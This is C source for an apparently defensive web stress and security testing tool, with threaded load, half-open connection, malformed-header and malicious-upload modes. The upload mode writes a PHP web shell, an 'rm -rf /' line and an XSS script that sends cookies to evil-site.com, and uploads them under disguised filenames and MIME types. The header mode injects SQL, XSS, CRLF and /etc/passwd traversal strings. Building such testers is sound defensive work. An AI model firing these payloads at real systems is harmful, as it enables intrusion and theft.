#define _DEFAULT_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/time.h>
#include <getopt.h>
#include <curl/curl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define MAX_URLS 1000
#define MAX_URL_LENGTH 512
#define DEFAULT_THREADS 5
#define DEFAULT_REQUESTS 100
#define DEFAULT_DURATION 120
#define MAX_LOG_LINE 1024
#define TOOL_NAME "OPHELIA Stress Testing Tool (OST)"
#define TOOL_VERSION "5.1.0"
#define ORGANIZATION "OPHELIA Project"
#define LICENSE "GNU GPL v3.0"
#define AUTHOR1 "Benjamin Sanchez Cardenas"
#define AUTHOR2 "-------------------------"

// Enumeración para los tipos de prueba
typedef enum {
    TEST_STANDARD,
    TEST_INCOMPLETE_CONNECTIONS,
    TEST_MALFORMED_HEADERS,
    TEST_INVALID_REQUESTS,
    TEST_XSS_ATTACKS,
    TEST_BUFFER_OVERFLOW,
    TEST_DOS_ATTACKS,
    TEST_COMMAND_INJECTION,
    TEST_FILE_UPLOAD_STANDARD,
    TEST_FILE_UPLOAD_MALICIOUS
} test_type_t;

// Estructura para los datos de cada hilo
typedef struct {
    char **urls;
    int url_count;
    int thread_id;
    int requests_per_thread;
    int duration_seconds;
    int success_count;
    int error_count;
    double total_time;
    volatile int active;
    char *log_dir; // Directorio para guardar logs
    test_type_t test_type; // Tipo de prueba a ejecutar
} thread_data_t;

// Buffer para las respuestas
struct curl_buffer {
    char *data;
    size_t size;
};

// Funciones para cada tipo de prueba
void *perform_standard_test(void *arg);
void *perform_incomplete_connections_test(void *arg);
void *perform_malformed_headers_test(void *arg);
void *perform_invalid_requests_test(void *arg);
void *perform_xss_attacks_test(void *arg);
void *perform_buffer_overflow_test(void *arg);
void *perform_dos_attacks_test(void *arg);
void *perform_command_injection_test(void *arg);
void *perform_file_upload_standard_test(void *arg);
void *perform_file_upload_malicious_test(void *arg);

// Función para mostrar el splash screen tipo Borland
void show_splash_screen() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                           %s                          ║\n", TOOL_NAME);
    printf("║                        Version %s                     ║\n", TOOL_VERSION);
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║                                                              ║\n");
    printf("║  Developed by: %s          ║\n", ORGANIZATION);
    printf("║  Authors: %-49s ║\n", AUTHOR1);
    printf("║           %-49s ║\n", AUTHOR2);
    printf("║  License: %s                                      ║\n", LICENSE);
    printf("║                                                              ║\n");
    printf("║  High-performance stress testing for OPHELIA applications   ║\n");
    printf("║  Copyright (C) 2025 %s                         ║\n", ORGANIZATION);
    printf("║                                                              ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
}

static size_t write_callback(void *contents, size_t size, size_t nmemb, struct curl_buffer *buffer) {
    size_t realsize = size * nmemb;
    char *ptr = realloc(buffer->data, buffer->size + realsize + 1);
    
    if (ptr == NULL) {
        fprintf(stderr, "No se pudo reasignar memoria\n");
        return 0;
    }
    
    buffer->data = ptr;
    memcpy(&(buffer->data[buffer->size]), contents, realsize);
    buffer->size += realsize;
    buffer->data[buffer->size] = 0;
    
    return realsize;
}

// Función para crear directorios
int create_directory(const char *path) {
    char tmp[256];
    char *p = NULL;
    size_t len;

    snprintf(tmp, sizeof(tmp), "%s", path);
    len = strlen(tmp);
    if (tmp[len - 1] == '/')
        tmp[len - 1] = 0;
    for (p = tmp + 1; *p; p++)
        if (*p == '/') {
            *p = 0;
            if (mkdir(tmp, S_IRWXU) != 0 && errno != EEXIST)
                return -1;
            *p = '/';
        }
    if (mkdir(tmp, S_IRWXU) != 0 && errno != EEXIST)
        return -1;
    
    return 0;
}

// Función para registrar respuesta exitosa
void log_success(const char *log_dir, int thread_id, const char *url, long response_code, double request_time) {
    char log_file[512];
    snprintf(log_file, sizeof(log_file), "%s/success.log", log_dir);

    FILE *fp = fopen(log_file, "a");
    if (fp) {
        time_t now = time(0);
        struct tm *timeinfo = localtime(&now);
        char time_str[100];
        strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", timeinfo);

        fprintf(fp, "[%s] THREAD_%d SUCCESS %ld %s TIME:%.4fs\n",
                time_str, thread_id, response_code, url, request_time);
        fclose(fp);
    }
}

// Función para registrar error
void log_error(const char *log_dir, int thread_id, const char *url, const char *error_msg, long response_code) {
    char log_file[512];
    snprintf(log_file, sizeof(log_file), "%s/errors.log", log_dir);

    FILE *fp = fopen(log_file, "a");
    if (fp) {
        time_t now = time(0);
        struct tm *timeinfo = localtime(&now);
        char time_str[100];
        strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", timeinfo);

        fprintf(fp, "[%s] THREAD_%d ERROR %ld %s - %s\n",
                time_str, thread_id, response_code, url, error_msg);
        fclose(fp);
    }
}

// Función para registrar cabeceras malformadas
void log_malformed_headers(const char *log_dir, int thread_id, const char *url, const char *malformed_headers) {
    char log_file[512];
    snprintf(log_file, sizeof(log_file), "%s/malformed_headers.log", log_dir);

    FILE *fp = fopen(log_file, "a");
    if (fp) {
        time_t now = time(0);
        struct tm *timeinfo = localtime(&now);
        char time_str[100];
        strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", timeinfo);

        fprintf(fp, "[%s] THREAD_%d URL: %s HEADERS: %s\n",
                time_str, thread_id, url, malformed_headers);
        fclose(fp);
    }
}

void print_help(char *program_name) {
    show_splash_screen();
    printf("\nUso: %s [OPCIONES]\n", program_name);
    printf("Herramienta de pruebas de estrés para OPHELIA\n\n");
    printf("Opciones:\n");
    printf("  -u, --urls FILE      Archivo con lista de URLs a probar (requerido)\n");
    printf("  -t, --threads NUM    Número de hilos concurrentes (por defecto: %d)\n", DEFAULT_THREADS);
    printf("  -r, --requests NUM   Número de solicitudes por hilo (por defecto: %d)\n", DEFAULT_REQUESTS);
    printf("  -d, --duration SEC   Duración máxima de la prueba en segundos (por defecto: %d)\n", DEFAULT_DURATION);
    printf("  -l, --log-dir DIR    Directorio para guardar archivos de logs (por defecto: ./logs)\n");
    printf("  -T, --test-type TYPE Tipo de prueba a realizar (standard|incomplete|malformed|invalid|xss|buffer|dos|command|upload-standard|upload-malicious; por defecto: standard)\n");
    printf("  -h, --help           Mostrar este mensaje de ayuda\n");
    printf("\nEjemplos:\n");
    printf("  %s -u urls_registradas.txt -t 10 -r 500\n", program_name);
    printf("  %s --urls urls_registradas.txt --threads 20 --duration 180 --log-dir ./test_logs\n", program_name);
    printf("  %s --urls urls_registradas.txt --test-type incomplete --threads 10\n", program_name);
    printf("  %s --urls urls_registradas.txt --test-type upload-standard --threads 5\n", program_name);
    printf("  %s --urls urls_registradas.txt --test-type upload-malicious --threads 3\n", program_name);
}

void *perform_standard_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    CURL *curl;
    struct curl_buffer read_buffer;
    struct curl_slist *headers = NULL;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;
    
    // Inicializar libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (!curl) {
        fprintf(stderr, "Error al inicializar curl en hilo %d\n", data->thread_id);
        return NULL;
    }
    
    // Configurar las opciones de curl
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    // Configurar headers comunes
    headers = curl_slist_append(headers, "User-Agent: OPHELIA-Stress-Test/1.0");
    headers = curl_slist_append(headers, "Accept: application/json, text/html, */*");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    printf("Hilo %d iniciando pruebas de estrés\n", data->thread_id);
    
    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }
    
    // Realizar las solicitudes
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }
        
        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }
        
        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        
        // Reiniciar buffer de lectura
        read_buffer.data = malloc(1);
        read_buffer.size = 0;
        
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);
        
        struct timeval start_req, end_req;
        gettimeofday(&start_req, NULL);
        
        CURLcode res = curl_easy_perform(curl);
        
        gettimeofday(&end_req, NULL);
        double request_time = (end_req.tv_sec - start_req.tv_sec) + 
                             (end_req.tv_usec - start_req.tv_usec) / 1000000.0;
        
        if (res != CURLE_OK) {
            char error_msg[256];
            snprintf(error_msg, sizeof(error_msg), "CURL_ERROR: %s", curl_easy_strerror(res));
            
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, error_msg, 0);
            }
            
            data->error_count++;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            if (response_code >= 200 && response_code < 300) {
                data->success_count++;
                
                if (data->log_dir) {
                    log_success(data->log_dir, data->thread_id, url, response_code, request_time);
                }
            } else {
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "HTTP_ERROR: %ld", response_code);
                
                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }
                
                data->error_count++;
            }
        }
        
        data->total_time += request_time;
        
        // Liberar buffer
        free(read_buffer.data);
        read_buffer.data = NULL;
        read_buffer.size = 0;
        
        request_count++;
        
        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }
    
    data->active = 0; // Marcar hilo como inactivo
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    
    printf("Hilo %d completado. Éxitos: %d, Errores: %d\n", 
           data->thread_id, data->success_count, data->error_count);
    
    return NULL;
}

void *perform_file_upload_standard_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    CURL *curl;
    struct curl_buffer read_buffer;
    struct curl_slist *headers = NULL;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    // Inicializar libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Error al inicializar curl en hilo %d\n", data->thread_id);
        return NULL;
    }

    // Configurar las opciones de curl
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    // Configurar headers comunes
    headers = curl_slist_append(headers, "User-Agent: OPHELIA-Stress-Test/1.0");
    headers = curl_slist_append(headers, "Accept: application/json, text/html, */*");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    printf("Hilo %d iniciando pruebas de subida de archivos estándar\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Realizar las solicitudes de subida de archivos
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Crear un archivo temporal pequeño para la subida
        char temp_filename[256];
        snprintf(temp_filename, sizeof(temp_filename), "/tmp/ost_temp_file_%d_%d.txt", data->thread_id, request_count);

        FILE *temp_file = fopen(temp_filename, "w");
        if (temp_file) {
            // Escribir contenido estándar de prueba
            fprintf(temp_file, "Archivo de prueba para subida #%d generado por OPHELIA Stress Tool\n", request_count);
            fprintf(temp_file, "Fecha y hora: %ld\n", time(NULL));
            fprintf(temp_file, "Contenido adicional para simular un archivo real: ");
            for (int i = 0; i < 50; i++) {
                fprintf(temp_file, "dato_%d ", i);
            }
            fclose(temp_file);
        } else {
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "TEMP_FILE_CREATION_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        // Configurar la subida de archivos con curl
        curl_mime *mime = curl_mime_init(curl);
        curl_mimepart *part = curl_mime_addpart(mime);

        curl_mime_name(part, "file");
        curl_mime_filename(part, "test_file.txt");
        curl_mime_filedata(part, temp_filename);
        curl_mime_type(part, "text/plain");

        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_URL, url);

        // Reiniciar buffer de lectura
        read_buffer.data = malloc(1);
        read_buffer.size = 0;

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        struct timeval start_req, end_req;
        gettimeofday(&start_req, NULL);

        CURLcode res = curl_easy_perform(curl);

        gettimeofday(&end_req, NULL);
        double request_time = (end_req.tv_sec - start_req.tv_sec) +
                             (end_req.tv_usec - start_req.tv_usec) / 1000000.0;

        if (res != CURLE_OK) {
            char error_msg[256];
            snprintf(error_msg, sizeof(error_msg), "FILE_UPLOAD_ERROR: %s", curl_easy_strerror(res));

            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, error_msg, 0);
            }

            data->error_count++;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            if (response_code >= 200 && response_code < 300) {
                data->success_count++;

                if (data->log_dir) {
                    log_success(data->log_dir, data->thread_id, url, response_code, request_time);
                }
            } else {
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "HTTP_ERROR: %ld", response_code);

                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }

                data->error_count++;
            }
        }

        data->total_time += request_time;

        // Liberar buffer
        free(read_buffer.data);
        read_buffer.data = NULL;
        read_buffer.size = 0;

        // Limpiar MIME
        curl_mime_free(mime);

        // Eliminar archivo temporal
        unlink(temp_filename);

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    printf("Hilo %d (subida de archivos estándar) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

void *perform_file_upload_malicious_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    CURL *curl;
    struct curl_buffer read_buffer;
    struct curl_slist *headers = NULL;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    // Inicializar libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Error al inicializar curl en hilo %d\n", data->thread_id);
        return NULL;
    }

    printf("Hilo %d iniciando pruebas de subida de archivos maliciosos\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Configurar las opciones de curl
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    // Realizar las solicitudes de subida de archivos maliciosos
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Crear diferentes tipos de archivos maliciosos para probar
        char temp_filename[256];
        snprintf(temp_filename, sizeof(temp_filename), "/tmp/ost_malicious_file_%d_%d", data->thread_id, request_count);

        FILE *temp_file = fopen(temp_filename, "w");
        if (temp_file) {

            // Dependiendo del conteo de solicitud, crear diferentes tipos de archivos maliciosos
            switch(request_count % 6) {
                case 0: // Archivo PHP malicioso
                    fprintf(temp_file, "<?php system($_GET['cmd']); ?>\n");
                    fprintf(temp_file, "# Archivo malicioso PHP para probar subida insegura\n");
                    break;
                case 1: // Archivo con secuencia de escape y comandos
                    fprintf(temp_file, "\n");
                    fprintf(temp_file, "system('rm -rf /'); # Simulación de comando peligroso (no ejecutado)\n");
                    fprintf(temp_file, "echo \"Este archivo intenta ejecutar comandos\";\n");
                    break;
                case 2: // Archivo con código JavaScript/XSS
                    fprintf(temp_file, "<script>\n");
                    fprintf(temp_file, "alert('XSS ataque a través de subida de archivo!');\n");
                    fprintf(temp_file, "window.location='http://evil-site.com/?cookie='+document.cookie;\n");
                    fprintf(temp_file, "</script>\n");
                    break;
                case 3: // Archivo con código SQL Injection
                    fprintf(temp_file, "-- SQL Injection payload\n");
                    fprintf(temp_file, "'; DROP TABLE users; --\n");
                    fprintf(temp_file, "UNION SELECT username,password FROM admin_users --\n");
                    break;
                case 4: // Archivo binario sospechoso (simulado con bytes)
                    for(int i = 0; i < 1024; i++) {
                        fprintf(temp_file, "%c", (char)(i % 256)); // Bytes potencialmente maliciosos
                    }
                    break;
                case 5: // Archivo con buffer overflow
                    for(int i = 0; i < 10000; i++) {
                        fprintf(temp_file, "A"); // Buffer overflow attempt
                    }
                    fprintf(temp_file, "\nFin del intento de buffer overflow\n");
                    break;
            }
            fclose(temp_file);
        } else {
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "MALICIOUS_FILE_CREATION_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        // Configurar la subida de archivos maliciosos con curl
        curl_mime *mime = curl_mime_init(curl);
        curl_mimepart *part = curl_mime_addpart(mime);

        curl_mime_name(part, "file");
        // Enviar con diferentes nombres de archivo para intentar eludir filtros
        char malicious_filename[256];
        switch(request_count % 4) {
            case 0:
                strcpy(malicious_filename, "image.jpg.php");  // Intento de PHP disfrazado
                break;
            case 1:
                strcpy(malicious_filename, "document.pdf.exe");  // Intento de ejecutable disfrazado
                break;
            case 2:
                strcpy(malicious_filename, "archive.tar.gz.jsp");  // Intento de JSP disfrazado
                break;
            case 3:
                strcpy(malicious_filename, "backup.sql.js");  // Intento de JS disfrazado
                break;
        }
        curl_mime_filename(part, malicious_filename);
        curl_mime_filedata(part, temp_filename);

        // Establecer diferentes tipos MIME para intentar eludir filtros
        char mimetype[64];
        switch(request_count % 4) {
            case 0:
                strcpy(mimetype, "image/jpeg");
                break;
            case 1:
                strcpy(mimetype, "application/pdf");
                break;
            case 2:
                strcpy(mimetype, "application/gzip");
                break;
            case 3:
                strcpy(mimetype, "text/plain");
                break;
        }
        curl_mime_type(part, mimetype);

        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_URL, url);

        // Reiniciar buffer de lectura
        read_buffer.data = malloc(1);
        read_buffer.size = 0;

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        struct timeval start_req, end_req;
        gettimeofday(&start_req, NULL);

        CURLcode res = curl_easy_perform(curl);

        gettimeofday(&end_req, NULL);
        double request_time = (end_req.tv_sec - start_req.tv_sec) +
                             (end_req.tv_usec - start_req.tv_usec) / 1000000.0;

        if (res != CURLE_OK) {
            char error_msg[256];
            snprintf(error_msg, sizeof(error_msg), "MALICIOUS_FILE_UPLOAD_ERROR: %s", curl_easy_strerror(res));

            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, error_msg, 0);
            }

            data->error_count++;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            if (response_code >= 200 && response_code < 300) {
                // Subida exitosa de archivo malicioso - esto es una vulnerabilidad crítica
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "CRITICAL_VULNERABILITY: MALICIOUS_FILE_UPLOADED_SUCCESSFULLY_AS_%s", malicious_filename);

                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }

                data->success_count++; // Contamos como "éxito" para el atacante
            } else {
                // Servidor rechazó el archivo malicioso
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "UPLOAD_REJECTED: %ld", response_code);

                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }

                data->error_count++;
            }
        }

        data->total_time += request_time;

        // Liberar buffer
        free(read_buffer.data);
        read_buffer.data = NULL;
        read_buffer.size = 0;

        // Limpiar MIME
        curl_mime_free(mime);

        // Eliminar archivo temporal
        unlink(temp_filename);

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    printf("Hilo %d (subida de archivos maliciosos) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

void *perform_incomplete_connections_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    printf("Hilo %d iniciando pruebas de conexiones incompletas\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Realizar las conexiones incompletas
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Parsear URL para obtener host y puerto
        char host[256];
        int port = 80;

        // Extraer host y puerto de la URL
        const char *host_start = url;
        if (strncmp(url, "http://", 7) == 0) {
            host_start = url + 7;
        } else if (strncmp(url, "https://", 8) == 0) {
            host_start = url + 8;
            if (port == 80) port = 443;  // Cambiar a puerto HTTPS por defecto
        }

        // Copiar host
        int i = 0;
        while (host_start[i] != '\0' && host_start[i] != ':' && host_start[i] != '/' && i < 255) {
            host[i] = host_start[i];
            i++;
        }
        host[i] = '\0';

        // Verificar si hay puerto explícito
        const char *port_pos = strchr(host_start, ':');
        if (port_pos != NULL) {
            port = atoi(port_pos + 1);
        }

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "SOCKET_CREATION_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        struct hostent *server = gethostbyname(host);
        if (server == NULL) {
            close(sock);
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "GETHOSTBYNAME_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
        server_addr.sin_port = htons(port);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "CONNECTION_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        // Conexion exitosa - dejarla abierta brevemente sin enviar solicitud completa
        // Esto simula conexiones que se establecen pero no se completan
        usleep(50000); // Mantener la conexión abierta 50ms sin enviar nada

        close(sock); // Cerrar después de dejarla abierta brevemente

        data->success_count++;
        if (data->log_dir) {
            log_success(data->log_dir, data->thread_id, url, 200, 0.05); // Aproximadamente 50ms

            // Registrar información sobre la conexión incompleta
            char log_msg[512];
            snprintf(log_msg, sizeof(log_msg), "CONNECTION_ESTABLISHED_TO:%s_PORT:%d_DURATION:50ms", host, port);
            log_error(data->log_dir, data->thread_id, url, log_msg, 200); // Usamos log_error para este tipo de evento
        }

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    printf("Hilo %d (conexiones incompletas) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

void *perform_malformed_headers_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    CURL *curl;
    struct curl_buffer read_buffer;
    struct curl_slist *headers = NULL;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    // Inicializar libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Error al inicializar curl en hilo %d\n", data->thread_id);
        return NULL;
    }

    printf("Hilo %d iniciando pruebas con cabeceras mal formadas\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Configurar opciones comunes de curl (sin headers inicialmente)
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);  // Reducir timeout
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "OPHELIA-Stress-Test/1.0");

    // Realizar las solicitudes con cabeceras mal formadas
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Configurar la URL
        curl_easy_setopt(curl, CURLOPT_URL, url);

        // Configurar cabeceras deliberadamente mal formadas
        if (headers) {
            curl_slist_free_all(headers); // Liberar headers anteriores
        }
        headers = NULL;

        // Agregar cabeceras más agresivamente mal formadas
        headers = curl_slist_append(headers, "User-Agent: OPHELIA-Stress-Test/1.0");
        headers = curl_slist_append(headers, "Accept: */*");
        // Cabeceras mal formadas más agresivas
        headers = curl_slist_append(headers, "Malformed-Header-Value-Only");  // Sin ':'
        headers = curl_slist_append(headers, "Invalid: Header\r\nX-Injection:Injected");  // Caracteres de nueva línea
        headers = curl_slist_append(headers, "X-SQL-Injection: SELECT * FROM users WHERE id=1' OR '1'='1");  // SQL injection attempt
        headers = curl_slist_append(headers, "X-Path-Traversal: ../../../../../etc/passwd");  // Path traversal attempt
        headers = curl_slist_append(headers, "X-Script: <script>alert('XSS')</script>");  // XSS attempt
        headers = curl_slist_append(headers, "X-Long-Header: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");  // Long header
        headers = curl_slist_append(headers, "Connection: close");

        // Registrar las cabeceras malformadas que se están enviando
        if (data->log_dir) {
            log_malformed_headers(data->log_dir, data->thread_id, url,
                "User-Agent: OPHELIA-Stress-Test/1.0 | Accept: */* | Malformed-Header-Value-Only | Invalid: Header\\r\\nX-Injection:Injected | X-SQL-Injection: SELECT * FROM users WHERE id=1' OR '1'='1 | X-Path-Traversal: ../../../../../etc/passwd | X-Script: <script>alert('XSS')</script> | X-Long-Header: [LONG STRING] | Connection: close");
        }

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Reiniciar buffer de lectura
        read_buffer.data = malloc(1);
        read_buffer.size = 0;

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        struct timeval start_req, end_req;
        gettimeofday(&start_req, NULL);

        CURLcode res = curl_easy_perform(curl);

        gettimeofday(&end_req, NULL);
        double request_time = (end_req.tv_sec - start_req.tv_sec) +
                             (end_req.tv_usec - start_req.tv_usec) / 1000000.0;

        if (res != CURLE_OK) {
            char error_msg[256];
            snprintf(error_msg, sizeof(error_msg), "MALFORMED_HEADER_ERROR: %s", curl_easy_strerror(res));

            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, error_msg, 0);
            }

            data->error_count++;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            if (response_code >= 200 && response_code < 300) {
                data->success_count++; // Aunque sea una cabecera mal formada, si responde, contamos como éxito

                if (data->log_dir) {
                    log_success(data->log_dir, data->thread_id, url, response_code, request_time);
                }
            } else {
